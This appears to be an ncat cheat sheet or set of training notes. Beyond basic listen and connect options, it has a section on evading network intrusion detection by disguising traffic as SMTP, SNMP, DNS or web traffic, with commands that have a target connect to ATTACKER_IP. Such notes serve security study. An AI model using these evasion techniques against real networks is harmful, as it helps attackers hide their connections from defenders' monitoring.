Ncat - networking utility which reads and writes data across networks
Source: https://nmap.org/ncat/

Usage:
  nc -lvnp PORT_NUM       To listen using TCP where port number is the port you want to listen to
  nc TARGET_IP PORT_NUM   To connect to an Ncat instance listening on a TCP port

Options:
  -l   Tells ncat to listen for incoming connections
  -v   Gets more verbose output as ncat binds to a source port and receives a connection
  -n   Avoids resolving hostnames
  -p   Specifies the port number that ncat will listen on
  -u   Listen using UDP

Network Security Evasion via Protocol Manipulation:
Rely on a Different Protocol:
  nc -ulvnp PORT_NUM        To listen using UDP where port number is the port you want to listen to
                            Note that unless you add -u, ncat will use TCP by default
  nc -u TARGET_IP PORT_NUM  To connect to an Ncat instance listening on a UDP port

Informational:
  Consider the following two examples:
    Running ncat -lvnp 25 on the attacker system and connecting to it will give the impression that
    it is a usual TCP connection with an SMTP server, unless the IDS/IPS provides deep packet inspection (DPI).
    Executing ncat -ulvnp 162 on the attacker machine and connecting to it will give the illusion
    that it is a regular UDP communication with an SNMP server unless the IDS/IPS supports DPI.

Manipulate (Source) TCP/UDP Port:
  nc -ulvnp 53           You can try to camouflage the traffic as if it is some DNS traffic to listen on UDP port `53`, as a DNS server would
  nc -u ATTACKER_IP 53   On the target, you can make it connect to the listening server
  nc -lvnp 80            Alternatively, you can make it appear more like web traffic where clients communicate with an HTTP server
  nc ATTACKER_IP 80      On the target, you can make it connect to the listening server
